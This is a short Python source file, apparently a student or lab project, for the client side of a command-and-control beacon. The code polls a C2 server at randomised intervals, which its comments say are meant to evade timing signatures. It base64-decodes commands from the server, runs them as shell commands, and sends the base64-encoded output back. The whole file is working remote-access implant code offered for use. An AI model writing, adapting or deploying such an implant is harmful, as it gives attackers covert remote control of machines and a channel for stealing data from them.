# Stephen Graver - beacon.py
# Client side script

import os
import time
import random
import base64
import requests
import subprocess

# config
C2_URL = "http://127.0.0.1:5000"  # IP for c2
BEACON_ID = "GRV-01"
BASE_INTERVAL = 30  # sec
JITTER_PERCENT = 0.2  # 20% jitter

# calculates a random sleep time to evade timing signatures.
def get_jitter_sleep():
    offset = BASE_INTERVAL * JITTER_PERCENT
    return BASE_INTERVAL + random.uniform(-offset, offset)

# simple Base64 encoding for OpSec.
def obfuscate(data):
    return base64.b64encode(data.encode()).decode()

# decodes commands from the C2.
def deobfuscate(data):
    return base64.b64decode(data.encode()).decode()

# checks in with C2 and retrieves pending commands.
def send_heartbeat():
    try:
        response = requests.get(f"{C2_URL}/checkin/{BEACON_ID}", timeout=10)
        if response.status_code == 200 and response.text:
            cmd = deobfuscate(response.text)
            if cmd.lower() == "exit":
                return False
            execute_command(cmd)
    except Exception:
        pass
    return True

# executes shell commands and sends output back.
def execute_command(cmd):
    try:
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout, stderr = proc.communicate()
        output = stdout.decode() + stderr.decode()
        requests.post(f"{C2_URL}/results/{BEACON_ID}", data={"output": obfuscate(output)})
    except Exception as e:
        requests.post(f"{C2_URL}/results/{BEACON_ID}", data={"output": obfuscate(str(e))})

# main
if __name__ == "__main__":
    print(f"[*] Starting Beacon {BEACON_ID}...")
    running = True
    while running:
        running = send_heartbeat()
        time.sleep(get_jitter_sleep())